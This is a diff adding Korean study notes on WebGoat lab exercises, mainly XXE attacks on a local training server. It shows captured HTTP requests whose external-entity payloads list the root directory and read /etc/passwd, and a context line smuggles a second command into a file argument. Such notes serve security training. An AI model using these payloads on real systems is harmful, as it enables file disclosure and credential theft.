@@ -505,8 +505,78 @@ Runtime.getRuntime().exec("type \"c:\.........\AccessControlMatrix.help" %26 ipc
 
 Tabnabbing : (피싱)동영상 new타겟으로 새창을 열고 전에 띄웠던 페이지에서 공격자가 계속 공격코드가 진행되는 것
 
+==================================================================
+#)XXE 취약점 
+
+#1 Intercept를 이용해서 요청 파라미터 내용을 확인(댓글입력) → XML 문서의 일부로 전달되는 것을 확인 
+
+POST /WebGoat/xxe/simple HTTP/1.1
+Host: localhost:8282
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml    //xml문서로 파라미터를 던진다(댓글내용)
+X-Requested-With: XMLHttpRequest
+Content-Length: 58
+Origin: http://localhost:8282
+Connection: close
+Referer: http://localhost:8282/WebGoat/start.mvc
+Cookie: JSESSIONID=tDAHsbQeVX4QU8w3a0lb56rbOpMjLuSXy9kJIqsg
+
+<?xml version="1.0"?>   //burpsuite에서 수정
+<comment>
+	<text>
+	   댓글내용
+	</text>
+</comment>
 
 
+공격 1. <!DOCTYPE> 태그를 이용해 외부 엔티티를 만들어 LFI(Local File Inclusion) 공격을 시도
+공격 문자열(댓글입력)
+POST /WebGoat/xxe/simple HTTP/1.1
+Host: localhost:8282
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml
+X-Requested-With: XMLHttpRequest
+Content-Length: 58
+Origin: http://localhost:8282
+Connection: close
+Referer: http://localhost:8282/WebGoat/start.mvc
+Cookie: JSESSIONID=tDAHsbQeVX4QU8w3a0lb56rbOpMjLuSXy9kJIqsg
+
+<?xml version="1.0"?>  //댓글내용 burpsuite로 수정
+<!DOCTYPE hack [<!ENTITY rootdir SYSTEM "file:///">]>
+<comment><text>&rootdir;</text></comment>
+
+결과 → 루트 디렉터리의 디렉터리 목록을 댓글내용에 출력
+
+--------------------------------------------------
+공격 문자열
+POST /WebGoat/xxe/simple HTTP/1.1
+Host: localhost:8282
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml
+X-Requested-With: XMLHttpRequest
+Content-Length: 58
+Origin: http://localhost:8282
+Connection: close
+Referer: http://localhost:8282/WebGoat/start.mvc
+Cookie: JSESSIONID=tDAHsbQeVX4QU8w3a0lb56rbOpMjLuSXy9kJIqsg
+
+<?xml version="1.0"?>
+<!DOCTYPE hack [<!ENTITY passwd SYSTEM "/etc/passwd">]>
+<comment><text>&passwd;</text></comment>
+
+결과 → /etc/passwd 파일의 내용이 출력 ⇒ 계정 정보 탈취
+
+-----------------------------------------------
 
 
 
